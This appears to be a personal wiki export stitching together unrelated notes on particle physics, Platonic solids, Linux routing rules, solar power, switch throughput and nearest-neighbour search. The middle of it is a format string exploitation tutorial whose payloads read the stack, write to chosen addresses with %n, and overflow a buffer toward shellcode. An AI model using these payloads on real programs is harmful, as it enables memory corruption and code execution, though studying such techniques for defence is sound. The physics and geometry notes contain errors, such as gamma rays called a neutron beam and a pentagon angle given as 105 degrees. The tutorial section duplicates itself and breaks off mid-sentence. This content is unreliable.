Leptons are a class of partciles which are very light such as electrons, neutrions, muions. Muion is a heavier version of electron.

!Force carrying particles
Same charges repel each other. An electron repels an electron. An electron creates a force carrying patricle and sends it to the other electron, which recoils and moves away due to the force of the transferred particle. The 2nd electron alos does the same thing repelling the first electron. These force particles are \Bphotons\B

!Dalton's theory
Dalton measured various chemical reactions, and observed the weight is always conserved. That is the same number of say carbon atoms and nitrogen atoms comes out of chemical reactions which weigh some number of units. 

!Dimitriv Mendelev's periodic table
Dimitriv based on dalton's theory starting calculating various kind of atoms present in the world. His theory stated that chemical reactions are just exchange of atoms from one compound into another compound. 
Dimitriv created the periodic based upon his measurements of weights of atoms. He organised these atoms based upon the properties of the atoms. 

!Brownian Motion
A dust particle of pollen when put in a fluid, the little particle would jiggle around moved in either direction randomly. Einstien's theory is the little particle is being hit by atoms from both sides, when the force one side is greater than other side the particle moves that side. 

!Radioactivity
Energy coming out of elements without any reaction. Common Radiation is 
# ''Alpha radiation'' +vely charged, proton beam
# ''Beta radiation'' (cathode rays) -vely charged, electron beam
# ''Gamma radiation'' (X-rays), bones absord X-rays, neutron beam

!Plank's theory
Plank analysed how elements emit light when heated. When you jiggle a charge a little elecromagnetic wave which travel away which is called light a wave. Light was understood to be wave. According to plank light is emitted in quantums of light, which is in agreement with the data. 

!Einstein's papers
Einstein after completing his Phd worked in a patent office, durin which time he published 3 papers.
# ''Brownian Motion'', qunatitive demonstration of atoms are real
# ''Special Theory of relativity''
# ''Photo-electric effect'', when light hits metal electricity is produced.  

!Neil Bohr's theory
Electron orbit is made up of qunatums. Electron is ''wave-particle duality''. Electron is both wave and particle at the same time. 

!Schrodinger's equation
Its a equation which can be solved to find electron properties like energy.

!Max born
Electron is travelling in a wave, but the equation explains where the electron is likely to be found and where it is not likely to be not found. 

!Heisenberg' uncertainity principle
Its a forumula which says if you have information about one thing then you lose information about another thing.

!Paul DeRac Qunatum Electro-dynamics QED
DeRac QED is consistent with quantum mechanics and theory of relativity. Electron is a point like object. Even thoudh its a point it has a mass, charge and spin.

!Anti-Matter
Same mass and spin but different charge. Electron anit-matter is positron. When matter and anti-matter meet they annilate each other. 

!Yukawa's theory
Yukawa described the strong nuclear force inside the nucleus. Similar to electron which produces a photon and sends it to the other electron which causes both of them to repel each other, protons also produce some particles. Strong nuclear forces is atleast 1000 times stronger than electric force. Strong nuclear force is made up of particle which is massive. The way this particle is created by following heisenberg uncertainity principle which allows to use energy around for a very small amount of time and create a particle and use it as force carrier. The principle also explains how much amount of energy can be borrowed and for how long. These particles are called mesons. This force increase with lesser distance as the time to travel for the meson is smaller it can be more heavier. These type os mesons are callee pions, there also other types of mesons (vritual particles). 

!Natural Radiation
From the sky called cosmic radiation from stars and sun. Mostly of high energy protons. 

!Ion trails
When radiation like alpha or beta rays which are charged when hits matter repels the electric charge in atom. As the rays pass through the matter it leaves an ion trail, which have either more postive or negavtive charge. 

!Particle Accelarators
Particle accelarators are apparatus which can detect the charge particle beam. When a photographic plate is exposed to charged particle beam it will leave a ion trail in the plate. The intensity of the trail can be used to find out properties about the particle beam. Highly charged particly would leave thicker beam. 
# ''Cloud chamber'' - a chamber closed with piston and containing gas. When the piston is released the gas expands and expanded gas likes to condense. When this condensed gas is exposed to ion trail it would leave a trail of water droplets. Even though the ion trail is microscopic the water droplet trail is visible. The cloud chamber is 3d when compared to photographic plate which is 2d. 
# ''Bubble chamber'' - similar principle to cloud chamber but uses superheated water

The density of water droplets describes the properties of charged particle bream. This when combined with magnetic field, which can be used to deflect the charged beam helps to find more properties. Stronger beam would bend less. 

!Faraday
Faraday proposed that space between the nucleus and the electron is not empty, but is filled with electro-magnetic field. This field is a source of energy and can be used to borrow energy to create particle an anti-particle. Therefore an atom is composed of electron, proton and a electric field which can produce different number of particle and anti-particle pairs. These virtual particles are called vaccum fluctuations. 

[[feinman's diagrams]]

!Gellman's model
Proton is made of quarks. There were 3 types of quarks in this model called up,down and strange. A particle can be made up of different combination of these quarks. According to this model a meson is quark and anti-quark. Yukawa's pion is an up-quark and anti-down-quark. Corks are described as point like particle like electrons.
In this model a proton is up,up and down quark combination. Each of these quark has a particular spin. up has 1/2 spin, down has -1/2 spin, so a proton has a 1/2 spin. up and down quark weight about 1/3 unit. A neutron is made up of one up quark and 2 down quarks. An up quark has charge +2/3 and down has -1/3. 
Gellman proposed a strangeness number. A berion is up,down and strange, has a strangeness 1. Strange particle is a little heavier than up/down quark. A strange,strange,strange particle is called omega. A strange particle has the same charge as down quark. 

!Delta particle
A delta particle is a little heavier than proton, and very quickly decays into a proton. A delta particle is made up of up,up,up quarks. 

!Colour property
An up quark with the same spin cannot be kept with an up quark of the same spin. So if a particle with 3 up quarks exist, then they need to have some property which has different values. This colour property is the charge of the quark which helps the quarks to stick together called colour charge. The colour force is the force that arises when two colour charges gets close together.
So a object with quarks of 3 differnet colours is colour neutrual. Protons and neutrons are colour neutral. Even though the protons and neutrons are colour neutral the colour is distributed in the proton. When the protons are far apart the effect of distributedness is low and hence they do not experience cloour force. When the protons comes close the distributedness of the colour charge comes into effect and both protons attrct towards each other. 
A meson is made up of quark of one colour and anit-quark with anti-colour. 

!Quantum chrom-dynamics - QCD
Quantum field of colours. When a colour field around a coloured object is jiggled it creates glueons and anti-glueons. Unlike photons, mesons which are electrically neutral, glueons are not colour neutral. Glueons have colour charge and hence the field around a glueon is charged. Glueons travelling from the one colour charge to another can interact with other glueons, hence the colour force is a lot more stronger than electric force. The force gets stronger by time. When we try to pull two colour charges away the glueon force gets strouger and grows with distance. If we try pullout a quark the colour force gets stronger and stronger and it is impossible to pull out a quark out of a proton, that is why we donot find an individual quark. We can only find a colour neutral particle, a particle with 3 quarks and colour neutral such as neutrons and protons, a particle with 2 quarks with colour and anti-colour. We cannot find a non-colour neutral particle in lab.

!Weak force Particles
Weak force carriers are called w+ and w- particles and 'z' particles. The w particle is incredibly massive, hence can only be borrowed for a extraordinary short time. The mass of a w boson is around 80 times that of a proton. 

!Neutrino
Neutrino has no electric charge, no mass. It can only be emitted or absorbed by w bosons, i.e a neutrino can only interact with weak force. They have spin 1/2. A neutrino produced by beta decay is an electron-flavoured neutrino. When this neutrino interacts with the nucleus then it is likely to produce electron, it will never produce a muion. When a muion decays to produce electron, it also produces muion-flavoured neutrino and an electron-flavoured neutrino. Every nulcear reaction in the sun produces a neutrino.  

!Beta decay
A neutron converting into a proton and electron. Beta decay produces another particle neutrino.

!Strangeness
Strangeness is preserved during strong force interactions but not during weak force interactions. 

!Particles
* Strongly interacting particles (hedrons)
# protons, neutrons, pions
# berions
** particle like particles protons, neutrons
** spin 1/2 or 3/2 or 5/2 but never integers
# mesons
** pions, kions that can decay into mesons 
** spin 0,1,2 always integers

Weakly interacting particles (leptons)
# electron
# neutrino
# muion

fermions are particles with spin 1/2
bosons are partciles with spin 0,1,2

photons are bosons. Photons have spin 1. bosons are mostly force carriers. 
glueons are bosons with spin 1. 
z particles are bosons with spin 1.

Four kions. +ve, -ve , +ve strange , -ive strange. 

!jpsi particle
is a meson lives for a very long time. Made up of Charm quark and anti-quark

!Charm quark 
Heavier version of up quark, similar to heavier version of down quark which is the strange quark.

!Electro-weak force theory
At higher energies weak forces get stronger. Weak force is similar to electro-magnetic forces. The mass of the z and w particle from this theory. 

!Higg's particle
The higg's field is everywhere. Every fundamental particle interacts with it. 

!Gauge symmetry

!CP-violation
Breaking of symmetry between matter and anti-matter. Weak interaction violates symmetry. Decay is not symmetry. A particle could decay into fundamental particles which conserve quantum numbers. It has been observed during decay the same number of particle and anti-particles are not observed. Matter is more common in nature than anti-matter. If the nature is made up of same amount of matter and anti-matter they would annihilate each other, and the world would be empty.

!Super Symmetry
Super partner of a particle have the same values for all qunatum numbers except spin. The spin of super partner is different. 

!String theory
The world is made up of lines(strings). String is the only fundamental particle in the world.

<pre>!Platonic Solids
There are only 5 3-d symmetric figures

# ''Cube''
# ''Tetrahedron'' - a 3d figure. with four sides as triangles. Similar to pyramid except the base is also a triangle 
# ''Octahedron'' - 8 triangle faces. Joining two pyramids gives a octahedron.
# ''Do-decahedron'' - 12 pentagon sides. 
# ''Icosohedron'' - 20 triangular faces. 

|Tetrahedron|

|Cube or Hexahedron|

|Octahedron|
|[img[images/Octahedron.gif]]|
|Do-decahedron|
|[img[images/Dodecahedron.gif]]|
|Icosohedron|
|[img[images/Icosahedron.gif]]|









It is not possible to have anymore other than these. 

In a triangle each angle is 60 degrees, so at a vertex we can have 3x60 4x60 5x60 angle being formed which result in tetrahedron, octahedron icosohedron respectively.

In a rectangle each angle is 90 degress, so at a vertex we can have 3x90 which result in cube.
In a pentagon each angle is 105 degrees, so at a vertex we can have 3x105 which result in do-decahedron. 
In a hexagon each angle is 120 degrees, so at a vertex having 3x120 results in a flat plane. 
Hence we cannot have any more symmetric solids other than these. 

!Edges and Vertices
|Solid|		Vertex|	Faces|	Edges|
|Cube|		8|	6|	12|
|Tetrahedron|	4|	4|	6|
|Octahedron|	6|	8|	8|
|Do-decahedron|	20|	12|	30|
|Icosohedron|	12|	20|	30|


!Duality
An Octahedron can be created by joining the midpoints the sides of a cube. This property is called duality. Octahedron is dual of cube. Icosohedron is dual of do-decahedron. A Tetrahedron is self-dual

<pre>!Routing Policy Database (RPDB)
''The routing policy database (RPDB)'' controls the order in which the kernel searches through the routing tables. Each rule has a priority, and rules are examined sequentially from rule 0 through rule 32767.
 
When a new packet arrives for routing (assuming the routing cache is empty), the kernel begins at the highest priority rule in the ~RPDB--rule 0. The kernel iterates over each rule in turn until the packet to be routed matches a rule. When this happens the kernel follows the instructions in that rule. Typically, this causes the kernel to perform a route lookup in a specified routing table. If a matching route is found in the routing table, the kernel uses that route. If no such route is found, the kernel returns to traverse the RPDB again, until every option has been exhausted.

!!unicast

A unicast rule entry is the most common rule type. This rule type simple causes the kernel to refer to the specified routing table in the search for a route. If no rule type is specified on the command line, the rule is assumed to be a unicast rule.

{{{
ip rule add unicast from 192.168.100.17 table 5
ip rule add unicast iif eth7 table 5
ip rule add unicast fwmark 4 table 4
}}}

!!nat
The nat rule type is required for correct operation of stateless NAT. This rule is typically coupled with a corresponding nat route entry. The RPDB nat entry causes the kernel to rewrite the source address of an outbound packet.
{{{
ip rule add nat 193.7.255.184 from 172.16.82.184
ip rule add nat 10.40.0.0 from 172.40.0.0/16
}}}

!!unreachable
Any route lookup matching a rule entry with an unreachable rule type will cause the kernel to generate an ICMP unreachable to the source address of the packet. 
{{{
ip rule add unreachable iif eth2 tos 0xc0
ip rule add unreachable iif wan0 fwmark 5
ip rule add unreachable from 192.168.7.0/25
}}}

!!prohibit
Any route lookup matching a rule entry with a prohibit rule type will cause the kernel to generate an ICMP prohibited to the source address of the packet. 
{{{
ip rule add prohibit from 209.10.26.51
ip rule add prohibit to 64.65.64.0/18
ip rule add prohibit fwmark 7
}}}

!!blackhole
While traversing the RPDB, any route lookup which matches a rule with the blackhole rule type will cause the packet to be dropped. No ICMP will be sent and no packet will be forwarded. 
{{{
ip rule add blackhole from 209.10.26.51
ip rule add blackhole from 172.19.40.0/24
ip rule add blackhole to 10.182.17.64/28

<pre>!Format string vulnerabililty
If an attacker is able to provide the format string to an ANSI C format function in part or as a whole, a format string vulnerability is present. By
doing so, the behaviour of the format function is changed, and the attacker may get control over the target application.

In the examples below, the string user is supplied by the attacker — he can control the entire ~ASCIIZ-string, for example through using a command line parameter.

Wrong usage:
{{{
int
func (char *user)
{
printf (user);
}
}}}
Ok:
{{{
int
func (char *user)
{
printf (&quot;%s&quot;, user);
}
}}}

!The stack and its role at format strings
{{{
printf (&quot;Number %d has no address, number %d has: %08x\n&quot;, i, a, &amp;a);
}}}
From within the printf function the stack looks like:

stack top
. . .
&lt;&amp;a&gt;
&lt;a&gt;
&lt;i&gt;
A
. . .
stack bottom

Type 1 (as in Linux rpc.statd, IRIX telnetd). Here the vulnerability lies in the second parameter to the syslog function. The format string is partly
usersupplied.
{{{
char tmpbuf[512];
snprintf (tmpbuf, sizeof (tmpbuf), &quot;foo: %s&quot;, user);
tmpbuf[sizeof (tmpbuf) - 1] = ’\0’;
syslog (LOG_NOTICE, tmpbuf);
}}}
Type 2 (as in wu-ftpd, Qualcomm Popper QPOP 2.53). Here a partly or completely usersupplied string is passed indirectly to a format function.
{{{
int Error (char *fmt, ...);
...
int someotherfunc (char *user)
{
...
Error (user);
...
}
...

}}}

!Crash of the program

By utilizing format strings we can easily trigger some invalid pointer access by just supplying a format string like:

{{{
printf (&quot;%s%s%s%s%s%s%s%s%s%s%s%s&quot;);
}}}

Because ‘%s’ displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to read from an illegal address, which is not mapped. Also most format function implementations offer the //‘%n// parameter, which can be used to write to the addresses on the stack. If that is done a few times, it should reliably produce a crash, too.

!Viewing the stack

{{{
printf (&quot;%08x.%08x.%08x.%08x.%08x\n&quot;);
}}}

This is a partial dump of the stack memory, starting from the current bottom upward to the top of the stack — assuming the stack grows towards the low addresses. Depending on the size of the format string buffer and the size of the output buffer, you can reconstruct more or less large parts of the stack memory by using this technique. In some cases you can even retrieve the entire stack memory.

!Viewing memory at any location

* Our format string is usually located on the stack itself, so we already have near to full control over the space, where the format string lies. 
* The format function internally maintains a pointer to the stack location of the current format parameter. If we would be able to get this pointer pointing into a memory space we can control, we can supply an address to the //%s// parameter. 
* To modify the stack pointer we can simply use dummy parameters that will //dig// up the stack by printing junk:
{{{
printf (&quot;AAA0AAA1_%08x.%08x.%08x.%08x.%08x&quot;);
}}}
The //%08x// parameters increase the internal stack pointer of the format function towards the top of the stack. After more or less of this increasing parameters the stack pointer points into our memory: the format string itself. The format function always maintains the lowest stack frame, so if our buffer lies on the stack at all, it lies above the current stack pointer for sure. If we choose the number of //%08x// parameters correctly, we could just display memory from an arbitrary address, by appending //%s// to our string. In our case the address is illegal and would be //AAA0//. Lets replace it with a real one.

Example:
address = 0x08480110
address (encoded as 32 bit le string): //\x10\x01\x48\x08//
{{{
printf (&quot;\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|&quot;);
}}}

!Exploitation - similar to common buffer overflows

{{{
{
char outbuf[512];
char buffer[512];
sprintf (buffer, &quot;ERR Wrong command: %400s&quot;, user);
sprintf (outbuf, buffer);
}
}}}
Such cases are often hidden deep inside reallife code and are not that obvious as shown in the example above. By supplying a special format
string, we are able to circumvent the //%400s// limitation: //%497d\x3c\xd3\xff\xbf&lt;nops&gt;&lt;shellcode&gt;//
Everything is similar to a normal buffer overflow exploit string, just
{{{
{
char outbuf[512];
char buffer[512];
sprintf (buffer, &quot;ERR Wrong command: %400s&quot;, user);
sprintf (outbuf, buffer);
}
}}}
Such cases are often hidden deep inside reallife code and are not that obvious as shown in the example above. By supplying a special format
string, we are able to circumvent the //%400s// limitation:
//%497d\x3c\xd3\xff\xbf&lt;nops&gt;&lt;shellcode&gt;//
Everything is similar to a normal buffer overflow exploit string, just the beginning — the //%497d// — is different. In normal buffer overflows
we overwrite the return address of a function frame on the stack. As the function that owns this frame returns, it returns to our supplied address.
The address points to somewhere within the //&lt;nop&gt;// space. There are good articles describing this method of exploitation and if this example is not fully

the beginning — the //%497d// — is different. In normal buffer overflows we overwrite the return address of a function frame on the stack. As the function that owns this frame returns, it returns to our supplied address. The address points to somewhere within the //&lt;nop&gt;//space. There are good articles describing this method of exploitation and if this example is not fully clear to you yet, you should consider reading an introductionary article, such as [5], first. It creates a string that is 497 characters long. Together with the error string (“ERR Wrong command: ”) this exceeds the outbuf buffer by four bytes. Although the ‘user’ string is only allowed to be as long as 400 bytes, we can extend its length by abusing format string parameters. Since the second sprintf is not checking the length, this can be used to break out of the boundaries of outbuf. Now we write a return address (0xbfffd33c) and exploit it just the old known way, as we would do it with any buffer overflow. While any format parameter that allows //stretching// the original format string, such as //%50d//, //%50f// or //%50s// will do, it is desireable to choose a parameter that does not dereference a pointer or may cause a division by zero. This rules out //%f// and //%s//. We are left with the integer output parameters: //%d//, //%u// and //%x//.

!Exploitation - through pure format strings

{{{
{
char buffer[512];
snprintf (buffer, sizeof (buffer), user);
buffer[sizeof (buffer) - 1] = ’\0’;
}

int i;
printf (&quot;foobar%n\n&quot;, (int *) &amp;i);
printf (&quot;i = %d\n&quot;, i);
}}}
Would print //i = 6//. With the same method we used above to print memory from arbitrary addresses, we can write to arbitrary locations:

//AAA0_%08x.%08x.%08x.%08x.%08x.%n//

With the //%08x// parameter we increase the internal stack pointer of the format function by four bytes. We do this until this pointer points to the
beginning of our format string (to //AAA0//). This works, because usually our format string is located on the stack, on top of our normal format
function stack frame. The //%n// writes to the address 0x30414141, that is represented by the string //AAA0//. Normally this would crash the program,
since this address is not mapped. But if we supply a correct mapped and writeable address this works and we overwrite four bytes (sizeof (int))
at the address:
//\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n//


!Stack Popping
A problem can arise if the format string is too short to supply a stack popping sequence that will reach your own string. This is a race between
the real distance to your format string and the size of the format string, in which you have to pop at least the real distance. So there is a demand for an effective method to increase the stack pointer with as few bytes as possible. Currently we have used only //%u// sequences, to show the principle, but there are more effective methods. A //%u// sequence is two bytes long and pops four bytes, which gives a 1:2 byte ratio (we invest 1 byte to get 2 bytes ahead).
Through using the //%f// parameter we even get 8 bytes ahead in the stack, while only investing two bytes. But this has a huge drawback, since
if garbage from the stack is printed as floating point number, there may be a division by zero, which will crash the process. To avoid this we can use a special format qualifier, which will only print the integer part of the float number: //%.f// will walk the stack upwards by eight bytes, using only three bytes in our buffer

!Direct Parameter Access

Beside improving the stack popping methods, there is a huge simplification which is known as //direct parameter access//, a way to directly address a stack parameter from within the format string. Almost all currently in use C libraries do support this features, but not all are useable to apply this
method to format string exploitation.
The direct parameter access is controlled by the //$// qualifier:
{{{
printf (&quot;%6$d\n&quot;, 6, 5, 4, 3, 2, 1);
}}}
Prints //1//, because the //6$// explicitly addresses the 6th parameter on the stack. Using this method the whole stack pop sequence can be left out.

!Response Based Brute Force

If we probe a distance of 32, the format string would look like:

//AAAABBBB|%u%u%u%u%u%u%u%u|%08x|//

We pop 32 bytes from the stack (8 * //%u//) and print the four bytes at the 32th byte from the stack hexadecimal. In the ideal case the output would
look like:
//AAAABBBB|983217938177639561760134608728913021|41414141|//

!Alternative targets

Common stack based buffer overflows allow only return address overwrites, because those are stored on the stack, too. With format functions however, we can write anywhere into the memory, allowing us to modify the entire writeable process space.

!!Branch and Bound
Branch and bound tree is built using the initial data set. The tree is built in such a way that at a node we either move to left or right or both based on a certain condition at that vertex. As we go on moving along the tree, we reach leaves ( could be more than 1 if at a vertex we had to go on both directions). We compute the distance for all of the leaves that we end up, the one nearest is the nearest neighbour. This algorithm is highly dependant on initial free for finding the nearest neighbour. 

!!Greedy walks
In this method we walk in the space from one point to another point if that point is closer than the point that is now, if there are more than 1 point closer to the input sample then we take the one that is closest to the input sample. When we end up at a state where we cannot move any further, then that point is called the nearest neighbour.

!!Mappings
In this method we increase the dimension space to very large, and then we compute the nearest neighbour in this space. 

!!Epsilon nets
The data is divided in space into groups. The first group would contain all the samples. The groups at the next level would be half the size in the space or so. We start our search from the first level and keep going down to lower levels. 

!Similarity search in Bipartite graphs
Examples :  say n persons and m movies, that is n person vertices in the graph and m movie vertices in the graphs. Links only go between person and movie. There are no person to person links, or movie to movie links. A link from person to movie indicates that the person likes this movie. 

!!Person-person similarity
To find person-person to similrity, i.e who are all the persons who like the same movies as this person. To find this attribute we need to find the 2-step chains from this person to other persons. What we are doing here is in the first step is to find all the movies the person like and in the second step we get links to all the persons that like this movie

!!Person-movie personality
To find person-movie personality, that is what are movies that this user might like. To find this we go one step ahead from what we have done in person-person similarity, after the 2-steps we know the persons who have the same taste as this person, from this person's node we go to the all the movies this person liks, which essentially gives all the movies that the actual user might like.

<div title="Solar Energy" modifier="YourName" created="200811081757" changecount="1">
<pre>!Solar energy 
Solar energy is the light and radiant heat from the Sun that influences Earth's climate and weather and sustains life. Solar power is sometimes used as a synonym for solar energy or more specifically to refer to electricity generated from solar radiation.

Solar energy technologies can provide electrical generation by heat engine or photovoltaic means, space heating and cooling in active and passive solar buildings; potable water via distillation and disinfection, daylighting, hot water, thermal energy for cooking, and high temperature process heat for industrial purposes.

The Earth receives 174 petawatts (PW) of incoming solar radiation (insolation) at the upper atmosphere.[1] Approximately 30% is reflected back to space while the rest is absorbed by clouds, oceans and land masses. The spectrum of solar light at the Earth's surface is mostly spread across the visible and near-infrared ranges with a small part in the near-ultraviolet.

Solar technologies are broadly characterized as either passive or active depending on the way they capture, convert and distribute sunlight. Active solar techniques use photovoltaic panels, pumps, and fans to convert sunlight into useful outputs. Passive solar techniques include selecting materials with favorable thermal properties, designing spaces that naturally circulate air, and referencing the position of a building to the Sun.

Active solar technologies increase the supply of energy and are considered supply side technologies, while passive solar technologies reduce the need for alternate resources and are generally considered demand side technologies.

!Electrical Generation
Sunlight can be converted into electricity using photovoltaics (PV), concentrating solar power (CSP), and various experimental technologies. PV has mainly been used to power small and medium-sized applications, from the calculator powered by a single solar cell to off-grid homes powered by a photovoltaic array.

For large-scale generation, CSP plants are used.

!!!Light Tube
Light tubes or light pipes are used for transporting or distributing natural or artificial light. In their application to daylighting, they are also often called sun pipes, solar pipes, solar light pipes, or daylight pipes.

Generally speaking, a light pipe or light tube may refer to:
* a tube or pipe for transport of light to another location, minimizing the loss of light;
* a transparent tube or pipe for distribution of light over its length, either for equidistribution along the entire length (see also sulfur lamp) or for controlled light leakage.

!High-temperature collectors
Where temperatures below about 95Â°C are sufficient, as for space heating, flat-plate collectors of the nonconcentrating type are generally used. The fluid-filled pipes can reach temperatures of 150 to 220 degrees Celsius when the fluid is not circulating. This temperature is too low for efficient conversion to electricity.

The efficiency of heat engines increases with the temperature of the heat source. To achieve this in solar thermal energy plants, solar radiation is concentrated by mirrors or lenses to obtain higher temperatures â a technique called Concentrated Solar Power (CSP). The practical effect of high efficiencies is to reduce the plant's collector size and total land use per unit power generated, reducing the environmental impacts of a power plant as well as its expense.

[img[images/parabolic.solar.jpg]]

As the temperature increases, different forms of conversion become practical. Up to 600Â°C, steam turbines, standard technology, have an efficiency up to 41%. Above this, gas turbines can be more efficient. Higher temperatures are problematic because different materials and techniques are needed.

Since the CSP plant generates heat first of all, it can store the heat before conversion to electricity. With current technology, storage of heat is much cheaper and more efficient than storage of electricity. In this way, the CSP plant can produce electricity day and night. If the CSP site has predictable solar radiation, then the CSP plant becomes a reliable power plant.

!!!System designs
During the day the sun has different positions. If the mirrors or lenses do not move, then the focus of the mirrors or lenses changes. Therefore it seems unavoidable that there needs to be a tracking system that follows the position of the sun (for solar photovoltaics a solar tracker is only optional). The tracking system increases the cost and complexity. With this in mind, different designs can be distinguished in how they concentrate the light and track the position of the sun.

!!!Parabolic trough designs
Parabolic trough power plants use a curved trough which reflects the direct solar radiation onto a receiver (also called absorber or collector) running along the trough, above the reflectors. The trough is parabolic in one direction and just straight in the other direction. For change of position of the sun orthogonal to the receiver, the whole trough tilts so that direct radiation remains focused on the receiver. However, a change of position of the sun parallel to the trough, does not require adjustment of the mirrors, since the light is just concentrated on another part of the receiver. So, the trough design avoids a second axis for tracking.

A substance (also called heat transfer fluid) passes through the receiver and becomes hot. Used substances are synthetic oil, molten salt and pressurized steam. The receiver can be in a vacuum chamber of glass. The light will shine through the glass and vacuum, but the vacuum will significantly reduce convective loss of the collected heat. The substance with the heat is transported to a heat engine where about a third of the heat is converted to electricity.

Tracking the sun from East to West by rotation on one axis, the high precision reflector panels concentrate the solar radiation coming directly from the sun onto an absorber pipe located along the focal line of the collector.

!!!Power tower designs
Power towers (also known as 'central tower' power plants or 'heliostat' power plants) use an array of flat, moveable mirrors (called heliostats) to focus the sun's rays upon a collector tower (the receiver).

[img[images/tower.solar.jpg]]

The advantage of this design above the parabolic trough design is the higher temperature. Thermal energy at higher temperatures can be converted to electricity more efficiently and can be more cheaply stored for later use. Furthermore, there is less need to flatten the ground area. In principle a power tower can be built on a hillside. Mirrors can be flat and plumbing is concentrated in the tower. The disadvantage is that each mirror must have its own dual-axis control, while in the parabolic trough design one axis can be shared for a large array of mirrors.

!!!Dish designs
A dish system uses a large, reflective, parabolic dish (similar in shape to satellite television dish). It focuses all the sunlight that strikes the dish up onto to a single point above the dish, where a receiver captures the heat and transforms it into a useful form.

[img[images/dish.solar.jpg]]

Advantage of a dish system is that it can achieve much higher temperatures due to the higher concentration of light (as in tower designs). Higher temperatures leads to better conversion to electricity and the dish system is very efficient on this point. However, there are also some disadvantages. Heat to electricity conversion requires moving parts and that results in maintenance. In general, a centralized approach for this conversion is better than the dencentralized concept in the dish design. Second, the (heavy) engine is part of the moving structure, which requires a rigid frame and strong tracking system. Furthermore, parabolic mirrors are used instead of flat mirrors and tracking must be dual-axis.

!!!Frensel reflectors
A linear Fresnel reflector power plant uses a series of long, narrow, shallow-curvature (or even flat) mirrors to focus light onto one or more linear receivers positioned above the mirrors. On top of the receiver a small parabolic mirror can be attached for further focusing the light. These systems aim to offer lower overall costs by sharing a receiver between several mirrors (as compared with trough and dish concepts), while still using the simple line-focus geometry with one axis for tracking. 

[img[images/frensel.solar.jpg]]

This is similar to the trough design (and different from central towers and dishes with dual-axis). The receiver is stationary and so fluid couplings are not required (as in troughs and dishes). The mirrors also do not need to support the receiver, so they are structurally simpler. When suitable aiming strategies are used (mirrors aimed at different receivers at different times of day), this can allow a denser packing of mirrors on available land area.

!Heat Exchange
Heat in a solar thermal system is guided by five basic principles: 
# heat gain
# heat transfer
# heat storage
# heat transport
# heat insulation.

Heat gain is the heat accumulated from the sun in the system. Solar thermal heat is trapped using the greenhouse effect; the greenhouse effect in this case is the ability of a reflective surface to transmit short wave radiation and reflect long wave radiation. Heat and infrared radiation (IR) are produced when short wave radiation light hits the absorber plate, which is then trapped inside the collector. Fluid, usually water, in the absorber tubes collect the trapped heat and transfer it to a heat storage vault.

Heat is transferred either by conduction or convection. When water is heated, kinetic energy is transferred by conduction to water molecules throughout the medium. These molecules spread their thermal energy by conduction and occupy more space than the cold slow moving molecules above them. The distribution of energy from the rising hot water to the sinking cold water contributes to the convection process. Heat is transferred from the absorber plates of the collector in the fluid by conduction.

Heat is transferred to a thermal storage medium in an insulated reservoir during hours with sunlight, and is withdrawn for power generation during hours lacking sunlight. Rate of heat transfer is related to the conductive and convection medium as well as the temperature differences. Bodies with large temperature differences transfer heat faster than bodies with lower temperature differences.

Heat storage allows a solar thermal plant to produce electricity at night and on overcast days. Heat is transferred to a thermal storage medium in an insulated reservoir during the day, and withdrawn for power generation at night. Thermal storage media include pressurized steam, concrete, a variety of phase change materials, and molten salts such as sodium and potassium nitrate.

A variety of fluids have been tested to transport the sun's heat, including water, air, oil, and sodium, but molten salt was selected as best. Molten salt is used in solar power tower systems because it is liquid at atmosphere pressure, it provides an efficient, low-cost medium in which to store thermal energy, its operating temperatures are compatible with today's high-pressure and high-temperature steam turbines, and it is non-flammable and nontoxic. In addition, molten salt is used in the chemical and metals industries as a heat-transport fluid, so experience with molten-salt systems exists for non-solar.

The molten salt is a mixture of 60 percent sodium nitrate and 40 percent potassium nitrate, commonly called saltpeter. The salt melts at 430 Â°F (220 Â°C) and is kept liquid at 550 Â°F (290 Â°C) in an insulated cold storage tank. The uniqueness of this solar system is in de-coupling the collection of solar energy from producing power, electricity can be generated in periods of inclement weather or even at night using the stored thermal energy in the hot salt tank. Normally tanks are well insulated and can store energy for up to a week.

<div title="Switch Perfromance" modifier="YourName" modified="201006080745" created="201006080740" changecount="3">
<pre>!Measuring Switch switching capacity
MPPS stands for million packets per second and Cisco prefers to refer throughput in MPPS. For a layer-3 switch an MPPS value is shared one. For some of the higher-end Cisco routers the routing is &quot;distributed&quot; between multiple line-cards, in which case the PPS numbers are based on the number of line cards, bit for non-distributed architectures (Catalyst switches) the numbers are based on the routing engine, so it is the maximum number of Packets per Second that the box can route.

For example, 2960-48PST-S is 13.3 Mpps.

The figure MPPS expresses the maximum number of frames per second that can be processed by the device. It is not dependent on frame size but clearly small frames require higher packet rates.

smallest frames in Ethernet are 64 bytes in size, taking in account the preamble (8 bytes) and the minimum inter-frame gap (the last two counts roughly for 20.2 bytes) to fill a GE port in one direction you need 1484560 frame per second.

10^9 / [(64+20.2)*8] where 8 is bits/byte.

So a number of 13.3 MPPS is equivalent to [((13.3 M * (64+20.2) * 8)) / 10^9 = 8.95 / 2=4.47] 4.47 GE ports filled with smallest frames bidirectional.

On the other hand frames of max size 1518 bytes require 81264 fps to fill a GE port in one direction.

So this number expresses the forwarding capability of the device.

A non blocking device with 48 GE ports would require 2 * 1484560 * 48 as MPPS or higher.

Therefore the performance of a device will be determined by combination of number of packets per sec and the size of the packet.

!!!sfs_tcp_reset
This program helps in sending a TCP reset to any connection that exists on the local node. The connection can be over any device, on virtual and physical ip. Usage syntax as on 23rd Feb 2010 is

Usage: tcp_reset device localip port remoteip port

The device argument specifies the device on which the connection has been established. Currently we do not automatically find out the device on which the localip is online. The localip should be plumbed on the device, no checks are made to verify this.

Steps during reset of the Connection

# Create a filter to capture incoming packets for this connection (localip:port -&gt; remoteip:port). We do this before sending out any packets, as we don't want to miss the ack that would be send immedieately after we send a tickle. If we create a filter after we send out a tickle, the reply from client could reach us before we start our capturing.
# Open a libnet handle to send packets out, with type RAW4 socket.
# Send a tickle for this connection, so the remote side on receiving this packet will send out a packet with seq no (ack no). We are only interested in the seq no. The packets that we send out are verified for correct seq no by the remote side, if the seq no does not match with the expected seq no on the remote side, the remote side will discard it.
